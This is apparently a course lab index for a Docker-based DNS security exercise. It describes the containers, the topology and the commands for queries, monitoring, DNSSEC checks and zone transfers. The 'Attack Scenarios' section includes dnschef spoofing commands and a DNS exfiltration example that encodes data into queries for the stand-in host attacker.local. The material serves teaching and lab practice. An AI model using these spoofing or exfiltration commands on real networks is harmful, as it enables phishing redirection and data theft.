# 🌐 Pertemuan 7: DNS Security - Lab Index

**Status:** ✅ Ready to Use  
**Last Updated:** 2025-10-27

---

## 📁 Folder Contents

### docker-compose.yml
- **Purpose:** Docker configuration untuk DNS Security lab
- **Services:**
  - `attacker-dns` (dnschef, Scapy)
  - `dns-resolver` (BIND9 recursive, port 53)
  - `dns-auth` (BIND9 authoritative, port 5353)
  - `web-target` (Phishing target, port 80)
  - `client-dns` (Testing client)
  - `monitor-dns` (tcpdump analysis)
- **Network:** 192.168.70.0/24
- **Start:** `docker-compose up -d`

### README.md
- **Purpose:** Setup guide dan lab workflow
- **Contains:**
  - DNS spoofing with dnschef
  - Python spoofing scripts
  - DNS exfiltration examples
  - Packet analysis techniques
  - Troubleshooting guide

### scripts/
- **Purpose:** DNS attack scripts
- **Available:**
  - `dns_spoof.py` - DNS response spoofing
  - (Add more as needed: dns_exfil.py, dns_enum.py)
- **Usage:**
  ```bash
  python3 scripts/dns_spoof.py 192.168.70.2 example.com
  ```

### captures/
- **Purpose:** DNS packet captures
- **Usage:**
  ```bash
  tcpdump -i eth0 -n port 53 -w dns.pcap
  docker cp monitor-dns:/tmp/dns.pcap captures/
  ```

### configs/
- **Purpose:** BIND9 configuration files
- **Files:**
  - named.conf (resolver config)
  - zone files (if needed)

---

## 🚀 Quick Start

```bash
# 1. Start lab (6 containers)
docker-compose up -d

# 2. Verify
docker-compose ps

# 3. Monitor DNS (Terminal 1)
docker-compose exec monitor-dns bash
tcpdump -i eth0 -n port 53 -A

# 4. Client queries (Terminal 2)
docker-compose exec client-dns bash
dig @192.168.70.3 google.com

# 5. DNS spoofing (Terminal 3)
docker-compose exec attacker-dns bash
python3 scripts/dns_spoof.py 192.168.70.2 example.com

# 6. Observe spoofed responses in Terminal 2
dig @192.168.70.3 example.com

# Cleanup
docker-compose down
```

---

## 📚 Next Steps

1. **Read:** [Pertemuan7.md](../Pertemuan7.md) - Full theory + hands-on
2. **Follow:** Hands-on sections (starting from section 5)
3. **Practice:**
   - DNS queries (A, AAAA, MX, NS, TXT)
   - DNS spoofing with dnschef
   - DNS response poisoning
   - DNS exfiltration
   - Zone transfer (if allowed)
   - DNSSEC basics
   - DNS-over-HTTPS alternative

---

## 💡 Key Tools Available

- **dnschef:** DNS spoofing tool
- **dig/nslookup:** DNS query tools
- **tcpdump:** Packet capture
- **Scapy:** Packet crafting
- **tshark:** Wireshark CLI
- **BIND9:** DNS server

---

## 📊 Lab Topology

```
Docker Network (192.168.70.0/24)
├── attacker-dns (192.168.70.2)
│   └── Tools: dnschef, Scapy, netcat
├── dns-resolver (192.168.70.3:53)
│   └── BIND9 Recursive Resolver
├── dns-auth (192.168.70.4:5353)
│   └── BIND9 Authoritative NS
├── web-target (192.168.70.5:80)
│   └── Phishing/redirection target
├── client-dns (192.168.70.6)
│   └── Testing client
└── monitor-dns (192.168.70.7)
    └── Monitoring/Analysis
```

---

## 🎯 Attack Scenarios

### DNS Spoofing with dnschef
```bash
# Spoof specific domain
dnschef --fakeip 192.168.70.2 \
        --fakedomains example.com \
        --interface 192.168.70.2 \
        --nameserver 192.168.70.3

# Spoof multiple domains
dnschef --fakeip 192.168.70.2 \
        --fakedomains 'example.com,google.com' \
        --interface 192.168.70.2
```

### Python DNS Spoofing
```bash
python3 scripts/dns_spoof.py 192.168.70.2 example.com
```

### DNS Exfiltration
```bash
# Client: send data via DNS
DATA=$(echo "secret-data" | base64)
nslookup $DATA.attacker.local 192.168.70.3

# Attacker: capture with tcpdump
tcpdump -i eth0 -n port 53 -A | grep attacker.local
```

---

## 📊 DNS Query Types

| Type | Purpose | Example |
|------|---------|---------|
| A | IPv4 address | example.com → 1.2.3.4 |
| AAAA | IPv6 address | example.com → :: |
| CNAME | Alias | www → example.com |
| MX | Mail server | Receive emails |
| NS | Nameserver | Zone delegation |
| TXT | Text | SPF, DKIM, verification |
| SOA | Zone info | Serial, refresh, retry |
| PTR | Reverse DNS | IP → hostname |
| AXFR | Zone transfer | Get all records |

---

## 🔧 Advanced Tests

### Zone Transfer
```bash
# Check if allowed
dig @192.168.70.4 -p 5353 example.local AXFR

# If allowed, get all records from zone
```

### Query Timing
```bash
# Monitor query response time
time dig @192.168.70.3 example.com

# Before cache: ~100-200ms
# After cache: ~1-2ms
# With spoofing: instant redirect
```

### DNSSEC Check
```bash
# Check if DNSSEC enabled
dig @192.168.70.3 example.com +dnssec

# Query with DNSSEC validation
dig @192.168.70.3 example.com +dnssec +cd
```

---

## 🔐 Security Notes

- All DNS queries confined to lab network
- No impact on external DNS infrastructure
- Safe for learning and experimentation
- Real-world exploitation requires network position (MITM, ARP spoof)

---

## 📝 What You'll Learn

- ✅ DNS resolution process (full flow)
- ✅ DNS record types and queries
- ✅ DNS cache and TTL behavior
- ✅ DNS spoofing techniques
- ✅ Cache poisoning attacks
- ✅ DNS exfiltration for data theft
- ✅ Zone transfer vulnerabilities
- ✅ DNSSEC (basic concepts)
- ✅ DNS-over-HTTPS (DoH) alternative
- ✅ Real-time DNS monitoring

---

## 💾 Data Collection

### Capture DNS Traffic
```bash
# In monitor-dns container
tcpdump -i eth0 -n port 53 -w dns.pcap

# Copy to host
docker cp monitor-dns:/tmp/dns.pcap captures/

# Analyze in Wireshark
wireshark captures/dns.pcap
```

### Query Analysis
```bash
# Show all DNS queries
tcpdump -i eth0 -n 'udp port 53' | grep DNS

# Show specific domain
tcpdump -i eth0 -n 'udp port 53' | grep example.com

# Count queries by type
tcpdump -i eth0 -n 'udp port 53' | grep -o 'A\|MX\|NS' | sort | uniq -c
```

---

## 🎓 Lab Outcomes

After completing this lab, you will understand:
- How DNS works end-to-end
- How to craft DNS queries programmatically
- How DNS poisoning works
- How to detect DNS spoofing
- Real-world DNS security implications
- How to set up DNS servers
- Monitoring and forensics techniques

---

**Ready to start?** Run `docker-compose up -d` and follow the hands-on guide!
